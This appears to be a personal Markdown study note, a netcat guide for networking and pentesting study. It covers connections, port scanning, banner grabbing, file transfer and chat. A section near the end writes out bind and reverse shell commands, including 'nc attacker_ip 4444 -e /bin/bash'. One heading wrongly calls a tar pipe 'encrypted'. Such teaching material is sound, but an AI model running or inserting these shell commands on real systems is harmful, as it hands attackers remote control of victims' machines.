---
tags:
  - netcat
  - networking
  - it/hacking/pentesting
  - it/socket
  - it/cybersecurity/cissp
aliases:
  - nc
  - netcat guide
---

# 🔌 Netcat (nc) Guide: From Beginner to Advanced

Netcat (also known as `nc`) is a simple, powerful tool for reading and writing data across network connections using TCP or UDP. It's called the "Swiss Army Knife" of networking.

---

## 📘 Table of Contents
1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Basic Usage](#basic-usage)
4. [Networking Utilities](#networking-utilities)
5. [File Transfers](#file-transfers)
6. [Port Scanning](#port-scanning)
7. [Chat / Messaging](#chat--messaging)
8. [Bind & Reverse Shells](#bind--reverse-shells)
9. [Security & Limitations](#security--limitations)
10. [Netcat vs Ncat vs Socat](#netcat-vs-ncat-vs-socat)

---

## 🧾 Introduction

Netcat lets you:
- Open TCP or UDP connections
- Listen on ports
- Send/receive files
- Act as a backdoor or shell (ethical hacking use)

---

## 💻 Installation

### Ubuntu/Debian:
```bash
sudo apt install netcat
```

### macOS:
```bash
brew install netcat
```

### Windows (via Nmap):
Use `ncat` bundled with Nmap: https://nmap.org/ncat/

---

## 🧰 Basic Usage

### Connect to a Server (Client Mode)
```bash
nc example.com 80
```

Type `GET / HTTP/1.1` and press Enter twice to see HTTP response.

### Start a TCP Server (Listener)
```bash
nc -l -p 1234
```

Now it's listening on port 1234.

---

## 🌐 Networking Utilities

### Port Scanner
```bash
nc -zv 192.168.1.1 1-1000
```

- `-z`: zero I/O mode (just scan)
- `-v`: verbose

### Banner Grabbing
```bash
nc scanme.nmap.org 80
```

Type:
```
HEAD / HTTP/1.0
```

---

## 📁 File Transfers

### Send a File
```bash
nc -l -p 4444 > received.txt
```

On sender machine:
```bash
nc target_ip 4444 < file.txt
```

---

### Encrypted File Transfer (with tar)
```bash
# On receiver
nc -l -p 4444 | tar xzvf -

# On sender
tar czf - folder/ | nc target_ip 4444
```

---

## 🗨️ Chat / Messaging

### Set up a simple 2-way chat:
On one machine:
```bash
nc -l -p 5555
```

On another:
```bash
nc ip_address 5555
```

You can now type messages back and forth.

---

## 🐚 Bind & Reverse Shells (Pentesting)

### Bind Shell (attacker connects to victim):
On victim:
```bash
nc -l -p 4444 -e /bin/bash
```

On attacker:
```bash
nc victim_ip 4444
```

### Reverse Shell (victim connects back to attacker):
On attacker:
```bash
nc -l -p 4444
```

On victim:
```bash
nc attacker_ip 4444 -e /bin/bash
```

---

## 🔐 Security & Limitations

- 🛑 Not encrypted (use `ncat --ssl` or SSH tunnels instead)
- ⚠️ Dangerous: can be used by attackers
- 🧱 Firewalls may block `nc`

---

## 🔁 Netcat vs Ncat vs Socat

| Tool   | Notes |
|--------|-------|
| `nc` (netcat) | Lightweight, basic networking |
| `ncat`        | Encrypted TLS support, Nmap-compatible |
| `socat`       | More complex, used for advanced redirections |

---

## 🧠 Mnemonic: **CHAT-P-FS**

- **C**hat
- **H**TTP Banners
- **A**dmin Backdoor (Shells)
- **T**ransfers (files)
- **P**ort Scanning
- **F**orensics
- **S**ervice Testing

---

Netcat is small, fast, and incredibly flexible. Mastering it gives you powerful capabilities in networking, pentesting, and security troubleshooting.





